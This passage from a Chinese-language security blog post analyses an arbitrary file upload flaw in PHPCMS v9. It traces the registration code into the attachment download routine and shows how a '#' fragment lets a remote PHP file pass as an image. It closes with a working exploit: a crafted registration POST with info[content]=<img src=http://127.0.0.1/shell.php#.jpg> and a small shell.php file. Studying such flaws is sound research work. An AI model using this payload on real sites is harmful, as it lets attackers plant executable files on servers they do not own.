class="keyword">if</span>($member_setting[<span class="string">'enablcodecheck'</span>]==<span class="string">'1'</span>)&#123;<span class="comment">//开启验证码</span></span><br><span class="line">			<span class="keyword">if</span> ((<span class="keyword">empty</span>($_SESSION[<span class="string">'connectid'</span>]) &amp;&amp; $_SESSION[<span class="string">'code'</span>] != strtolower($_POST[<span class="string">'code'</span>]) &amp;&amp; $_POST[<span class="string">'code'</span>]!==<span class="keyword">NULL</span>) || <span class="keyword">empty</span>($_SESSION[<span class="string">'code'</span>])) &#123;</span><br><span class="line">				showmessage(L(<span class="string">'code_error'</span>));</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				$_SESSION[<span class="string">'code'</span>] = <span class="string">''</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		$userinfo = <span class="keyword">array</span>();</span><br><span class="line">		$userinfo[<span class="string">'encrypt'</span>] = create_randomstr(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">		$userinfo[<span class="string">'username'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; is_username($_POST[<span class="string">'username'</span>])) ? $_POST[<span class="string">'username'</span>] : <span class="keyword">exit</span>(<span class="string">'0'</span>);</span><br><span class="line">		$userinfo[<span class="string">'nickname'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'nickname'</span>]) &amp;&amp; is_username($_POST[<span class="string">'nickname'</span>])) ? $_POST[<span class="string">'nickname'</span>] : <span class="string">''</span>;</span><br><span class="line">		</span><br><span class="line">		$userinfo[<span class="string">'email'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'email'</span>]) &amp;&amp; is_email($_POST[<span class="string">'email'</span>])) ? $_POST[<span class="string">'email'</span>] : <span class="keyword">exit</span>(<span class="string">'0'</span>);</span><br><span class="line">		$userinfo[<span class="string">'password'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) &amp;&amp; is_badword($_POST[<span class="string">'password'</span>])==<span class="keyword">false</span>) ? $_POST[<span class="string">'password'</span>] : <span class="keyword">exit</span>(<span class="string">'0'</span>);</span><br><span class="line">		</span><br><span class="line">		$userinfo[<span class="string">'email'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'email'</span>]) &amp;&amp; is_email($_POST[<span class="string">'email'</span>])) ? $_POST[<span class="string">'email'</span>] : <span class="keyword">exit</span>(<span class="string">'0'</span>);</span><br><span class="line"></span><br><span class="line">		$userinfo[<span class="string">'modelid'</span>] = <span class="keyword">isset</span>($_POST[<span class="string">'modelid'</span>]) ? intval($_POST[<span class="string">'modelid'</span>]) : <span class="number">10</span>;</span><br><span class="line">		$userinfo[<span class="string">'regip'</span>] = ip();</span><br><span class="line">		$userinfo[<span class="string">'point'</span>] = $member_setting[<span class="string">'defualtpoint'</span>] ? $member_setting[<span class="string">'defualtpoint'</span>] : <span class="number">0</span>;</span><br><span class="line">		$userinfo[<span class="string">'amount'</span>] = $member_setting[<span class="string">'defualtamount'</span>] ? $member_setting[<span class="string">'defualtamount'</span>] : <span class="number">0</span>;</span><br><span class="line">		$userinfo[<span class="string">'regdate'</span>] = $userinfo[<span class="string">'lastdate'</span>] = SYS_TIME;</span><br><span class="line">		$userinfo[<span class="string">'siteid'</span>] = $siteid;</span><br><span class="line">		$userinfo[<span class="string">'connectid'</span>] = <span class="keyword">isset</span>($_SESSION[<span class="string">'connectid'</span>]) ? $_SESSION[<span class="string">'connectid'</span>] : <span class="string">''</span>;</span><br><span class="line">		$userinfo[<span class="string">'from'</span>] = <span class="keyword">isset</span>($_SESSION[<span class="string">'from'</span>]) ? $_SESSION[<span class="string">'from'</span>] : <span class="string">''</span>;</span><br><span class="line">           ... ...</span><br><span class="line">           <span class="comment">//附表信息验证 通过模型获取会员信息</span></span><br><span class="line">		<span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;</span><br><span class="line">			<span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_input.class.php'</span>;</span><br><span class="line">	        <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_update.class.php'</span>;</span><br><span class="line">			$member_input = <span class="keyword">new</span> member_input($userinfo[<span class="string">'modelid'</span>]);		</span><br><span class="line">			$_POST[<span class="string">'info'</span>] = array_map(<span class="string">'new_html_special_chars'</span>,$_POST[<span class="string">'info'</span>]);</span><br><span class="line">			$user_model_info = $member_input-&gt;get($_POST[<span class="string">'info'</span>]);				        				</span><br><span class="line">		&#125;</span><br><span class="line">           ... ...</span><br></pre></td></tr></table></figure>



<p>关键代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;</span><br><span class="line">	<span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_input.class.php'</span>;</span><br><span class="line">       <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_update.class.php'</span>;</span><br><span class="line">	$member_input = <span class="keyword">new</span> member_input($userinfo[<span class="string">'modelid'</span>]);		</span><br><span class="line">	$_POST[<span class="string">'info'</span>] = array_map(<span class="string">'new_html_special_chars'</span>,$_POST[<span class="string">'info'</span>]);</span><br><span class="line">	$user_model_info = $member_input-&gt;get($_POST[<span class="string">'info'</span>]);				        				</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加载模块后，定义一个新的<code>member_input对象</code>．然后<code>POST</code>一个info．跟进<code>get()</code>函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;data = $data = trim_script($data);</span><br><span class="line">	$model_cache = getcache(<span class="string">'member_model'</span>, <span class="string">'commons'</span>);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db_pre.$model_cache[<span class="keyword">$this</span>-&gt;modelid][<span class="string">'tablename'</span>];</span><br><span class="line"></span><br><span class="line">	$info = <span class="keyword">array</span>();</span><br><span class="line">	$debar_filed = <span class="keyword">array</span>(<span class="string">'catid'</span>,<span class="string">'title'</span>,<span class="string">'style'</span>,<span class="string">'thumb'</span>,<span class="string">'status'</span>,<span class="string">'islink'</span>,<span class="string">'description'</span>);</span><br><span class="line">	<span class="keyword">if</span>(is_array($data)) &#123;</span><br><span class="line">		<span class="keyword">foreach</span>($data <span class="keyword">as</span> $field=&gt;$value) &#123;</span><br><span class="line">			<span class="keyword">if</span>($data[<span class="string">'islink'</span>]==<span class="number">1</span> &amp;&amp; !in_array($field,$debar_filed)) <span class="keyword">continue</span>;</span><br><span class="line">			$field = safe_replace($field);</span><br><span class="line">			$name = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'name'</span>];</span><br><span class="line">			$minlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'minlength'</span>];</span><br><span class="line">			$maxlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'maxlength'</span>];</span><br><span class="line">			$pattern = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'pattern'</span>];</span><br><span class="line">			$errortips = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'errortips'</span>];</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">empty</span>($errortips)) $errortips = <span class="string">"$name 不符合要求！"</span>;</span><br><span class="line">			$length = <span class="keyword">empty</span>($value) ? <span class="number">0</span> : strlen($value);</span><br><span class="line">			<span class="keyword">if</span>($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(<span class="string">"$name 不得少于 $minlength 个字符！"</span>);</span><br><span class="line">			<span class="keyword">if</span> (!array_key_exists($field, <span class="keyword">$this</span>-&gt;fields)) showmessage(<span class="string">'模型中不存在'</span>.$field.<span class="string">'字段'</span>);</span><br><span class="line">			<span class="keyword">if</span>($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) &#123;</span><br><span class="line">				showmessage(<span class="string">"$name 不得超过 $maxlength 个字符！"</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				str_cut($value, $maxlength);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'isunique'</span>] &amp;&amp; <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>($field=&gt;$value),$field) &amp;&amp; ROUTE_A != <span class="string">'edit'</span>) showmessage(<span class="string">"$name 的值不得重复！"</span>);</span><br><span class="line">			$func = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'formtype'</span>];</span><br><span class="line">			<span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</span><br><span class="line"></span><br><span class="line">			$info[$field] = $value;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</span><br></pre></td></tr></table></figure>

<p>这里的<code>$func</code>在为本文件中的<code>editor()</code>，原因是因为我们的payload为<code>info[content]</code>，然后跟进<code>editor()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">editor</span><span class="params">($field, $value)</span> </span>&#123;</span><br><span class="line">   $setting = string2array(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'setting'</span>]);</span><br><span class="line">   $enablesaveimage = $setting[<span class="string">'enablesaveimage'</span>];</span><br><span class="line">   $site_setting = string2array(<span class="keyword">$this</span>-&gt;site_config[<span class="string">'setting'</span>]);</span><br><span class="line">   $watermark_enable = intval($site_setting[<span class="string">'watermark_enable'</span>]);</span><br><span class="line">   $value = <span class="keyword">$this</span>-&gt;attachment-&gt;download(<span class="string">'content'</span>, $value,$watermark_enable);</span><br><span class="line">   <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后跟进download()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 附件下载</span></span><br><span class="line"><span class="comment"> * Enter description here ...</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $field 预留字段</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $value 传入下载内容</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $watermark 是否加入水印</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $ext 下载扩展名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $absurl 绝对路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $basehref </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($field, $value,$watermark = <span class="string">'0'</span>,$ext = <span class="string">'gif|jpg|jpeg|bmp|png'</span>, $absurl = <span class="string">''</span>, $basehref = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $image_d;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;att_db = pc_base::load_model(<span class="string">'attachment_model'</span>);</span><br><span class="line">	$upload_url = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;field = $field;</span><br><span class="line">	$dir = date(<span class="string">'Y/md/'</span>);</span><br><span class="line">	$uploadpath = $upload_url.$dir;</span><br><span class="line">	$uploaddir = <span class="keyword">$this</span>-&gt;upload_root.$dir;</span><br><span class="line">	$string = new_stripslashes($value);</span><br><span class="line">	<span class="keyword">if</span>(!preg_match_all(<span class="string">"/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i"</span>, $string, $matches)) <span class="keyword">return</span> $value;</span><br><span class="line">	$remotefileurls = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">		dir_create($uploaddir);</span><br><span class="line">		$remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">unset</span>($matches, $string);</span><br><span class="line">	$remotefileurls = array_unique($remotefileurls);</span><br><span class="line">	$oldpath = $newpath = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">foreach</span>($remotefileurls <span class="keyword">as</span> $k=&gt;$file) &#123;</span><br><span class="line">		<span class="keyword">if</span>(strpos($file, <span class="string">'://'</span>) === <span class="keyword">false</span> || strpos($file, $upload_url) !== <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">		$filename = fileext($file);</span><br><span class="line">		$file_name = basename($file);</span><br><span class="line">		$filename = <span class="keyword">$this</span>-&gt;getname($filename);</span><br><span class="line"></span><br><span class="line">		$newfile = $uploaddir.$filename;</span><br><span class="line">		$upload_func = <span class="keyword">$this</span>-&gt;upload_func;</span><br><span class="line">		<span class="keyword">if</span>($upload_func($file, $newfile)) &#123;</span><br><span class="line">			$oldpath[] = $k;</span><br><span class="line">			$GLOBALS[<span class="string">'downloadfiles'</span>][] = $newpath[] = $uploadpath.$filename;</span><br><span class="line">			@chmod($newfile, <span class="number">0777</span>);</span><br><span class="line">			$fileext = fileext($filename);</span><br><span class="line">			<span class="keyword">if</span>($watermark)&#123;</span><br><span class="line">				watermark($newfile, $newfile,<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">			&#125;</span><br><span class="line">			$filepath = $dir.$filename;</span><br><span class="line">			$downloadedfile = <span class="keyword">array</span>(<span class="string">'filename'</span>=&gt;$filename, <span class="string">'filepath'</span>=&gt;$filepath, <span class="string">'filesize'</span>=&gt;filesize($newfile), <span class="string">'fileext'</span>=&gt;$fileext);</span><br><span class="line">			$aid = <span class="keyword">$this</span>-&gt;add($downloadedfile);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;downloadedfiles[$aid] = $filepath;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> str_replace($oldpath, $newpath, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数是用于下载附件的．然后第一个关注点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match_all(<span class="string">"/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i"</span>, $string, $matches)) <span class="keyword">return</span> $value;</span><br></pre></td></tr></table></figure>

<p>这段代码的意思是：传入的下载内容要满足格式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">href|src=url.gif|jpg|jpeg|bmp|png</span><br></pre></td></tr></table></figure>



<p>接着第二个关注点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">	dir_create($uploaddir);</span><br><span class="line">	$remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进函数<code>fillurl</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillurl</span><span class="params">($surl, $absurl, $basehref = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($basehref != <span class="string">''</span>) &#123;</span><br><span class="line">		$preurl = strtolower(substr($surl,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">		<span class="keyword">if</span>($preurl==<span class="string">'http://'</span> || $preurl==<span class="string">'ftp://'</span> ||$preurl==<span class="string">'mms://'</span> || $preurl==<span class="string">'rtsp://'</span> || $preurl==<span class="string">'thunde'</span> || $preurl==<span class="string">'emule://'</span>|| $preurl==<span class="string">'ed2k://'</span>)</span><br><span class="line">		<span class="keyword">return</span>  $surl;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> $basehref.<span class="string">'/'</span>.$surl;</span><br><span class="line">	&#125;</span><br><span class="line">	$i = <span class="number">0</span>;</span><br><span class="line">	$dstr = <span class="string">''</span>;</span><br><span class="line">	$pstr = <span class="string">''</span>;</span><br><span class="line">	$okurl = <span class="string">''</span>;</span><br><span class="line">	$pathStep = <span class="number">0</span>;</span><br><span class="line">	$surl = trim($surl);</span><br><span class="line">	<span class="keyword">if</span>($surl==<span class="string">''</span>) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">	$urls = @parse_url(SITE_URL);</span><br><span class="line">	$HomeUrl = $urls[<span class="string">'host'</span>];</span><br><span class="line">	$BaseUrlPath = $HomeUrl.$urls[<span class="string">'path'</span>];</span><br><span class="line">	$BaseUrlPath = preg_replace(<span class="string">"/\/([^\/]*)\.(.*)$/"</span>,<span class="string">'/'</span>,$BaseUrlPath);</span><br><span class="line">	$BaseUrlPath = preg_replace(<span class="string">"/\/$/"</span>,<span class="string">''</span>,$BaseUrlPath);</span><br><span class="line">	$pos = strpos($surl,<span class="string">'#'</span>);</span><br><span class="line">	<span class="keyword">if</span>($pos&gt;<span class="number">0</span>) $surl = substr($surl,<span class="number">0</span>,$pos);</span><br><span class="line">	<span class="keyword">if</span>($surl[<span class="number">0</span>]==<span class="string">'/'</span>) &#123;</span><br><span class="line">		$okurl = <span class="string">'http://'</span>.$HomeUrl.<span class="string">'/'</span>.$surl;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>($surl[<span class="number">0</span>] == <span class="string">'.'</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(strlen($surl)&lt;=<span class="number">2</span>) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">elseif</span>($surl[<span class="number">0</span>]==<span class="string">'/'</span>) &#123;</span><br><span class="line">			$okurl = <span class="string">'http://'</span>.$BaseUrlPath.<span class="string">'/'</span>.substr($surl,<span class="number">2</span>,strlen($surl)<span class="number">-2</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$urls = explode(<span class="string">'/'</span>,$surl);</span><br><span class="line">			<span class="keyword">foreach</span>($urls <span class="keyword">as</span> $u) &#123;</span><br><span class="line">				<span class="keyword">if</span>($u==<span class="string">".."</span>) $pathStep++;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>($i&lt;count($urls)<span class="number">-1</span>) $dstr .= $urls[$i].<span class="string">'/'</span>;</span><br><span class="line">				<span class="keyword">else</span> $dstr .= $urls[$i];</span><br><span class="line">				$i++;</span><br><span class="line">			&#125;</span><br><span class="line">			$urls = explode(<span class="string">'/'</span>, $BaseUrlPath);</span><br><span class="line">			<span class="keyword">if</span>(count($urls) &lt;= $pathStep)</span><br><span class="line">			<span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				$pstr = <span class="string">'http://'</span>;</span><br><span class="line">				<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($urls)-$pathStep;$i++) &#123;</span><br><span class="line">					$pstr .= $urls[$i].<span class="string">'/'</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				$okurl = $pstr.$dstr;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$preurl = strtolower(substr($surl,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">		<span class="keyword">if</span>(strlen($surl)&lt;<span class="number">7</span>)</span><br><span class="line">		$okurl = <span class="string">'http://'</span>.$BaseUrlPath.<span class="string">'/'</span>.$surl;</span><br><span class="line">		<span class="keyword">elseif</span>($preurl==<span class="string">"http:/"</span>||$preurl==<span class="string">'ftp://'</span> ||$preurl==<span class="string">'mms://'</span> || $preurl==<span class="string">"rtsp://"</span> || $preurl==<span class="string">'thunde'</span> || $preurl==<span class="string">'emule:'</span>|| $preurl==<span class="string">'ed2k:/'</span>)</span><br><span class="line">		$okurl = $surl;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		$okurl = <span class="string">'http://'</span>.$BaseUrlPath.<span class="string">'/'</span>.$surl;</span><br><span class="line">	&#125;</span><br><span class="line">	$preurl = strtolower(substr($okurl,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">	<span class="keyword">if</span>($preurl==<span class="string">'ftp://'</span> || $preurl==<span class="string">'mms://'</span> || $preurl==<span class="string">'rtsp://'</span> || $preurl==<span class="string">'thunde'</span> || $preurl==<span class="string">'emule:'</span>|| $preurl==<span class="string">'ed2k:/'</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> $okurl;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$okurl = preg_replace(<span class="string">'/^(http:\/\/)/i'</span>,<span class="string">''</span>,$okurl);</span><br><span class="line">		$okurl = preg_replace(<span class="string">'/\/&#123;1,&#125;/i'</span>,<span class="string">'/'</span>,$okurl);</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'http://'</span>.$okurl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数中的关键代码在于</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pos = strpos($surl,<span class="string">'#'</span>);</span><br><span class="line"><span class="keyword">if</span>($pos&gt;<span class="number">0</span>) $surl = substr($surl,<span class="number">0</span>,$pos);</span><br></pre></td></tr></table></figure>

<p>这个他会将矛点以后内容就删掉了．如果构造的payload长这样<code>http://vps/shell.php#.jpg</code></p>
<p>那么就能构造出一个带有shell的url</p>
<p>然后继续看到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($upload_func($file, $newfile))</span><br></pre></td></tr></table></figure>

<p><code>$upload_func</code>实际上就是调用了<code>copy()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;upload_func = <span class="string">'copy'</span>;</span><br></pre></td></tr></table></figure>

<p><code>$file</code>就是我们的上传文件url．然后<code>$newfile</code>就是文件保存路径．</p>
<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?m=member&amp;c=index&amp;a=register&amp;siteid=1</span><br><span class="line">POST:siteid=1&amp;modelid=11&amp;username=123456&amp;password=123456&amp;email=123456@qq.com&amp;info[content]=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://127.0.0.1/shell.php#.jpg</span>&gt;</span>&amp;dosubmit=1</span><br></pre></td></tr></table></figure>

<p>然后shell.php的内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;?php  phpinfo(); ?&gt;"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>然后文件路径.由于</p>
<p><img src="/.com//cookie/blog/source/_posts/phpcmsv9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png" alt="1581353481111"></p>
<p>这里的插入数据库操作，由于payload中的<code>content</code>字段数据库中并没有，所以会报错</p>
<p><img src="/.com//cookie/blog/source/_posts/phpcmsv9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%EF%BC%92.png" alt="1581353686001"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>希望自己在进步，冲！！！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/10/phpcmsv9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-id="ck8sqr5k40016kou55vlmdoa3" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
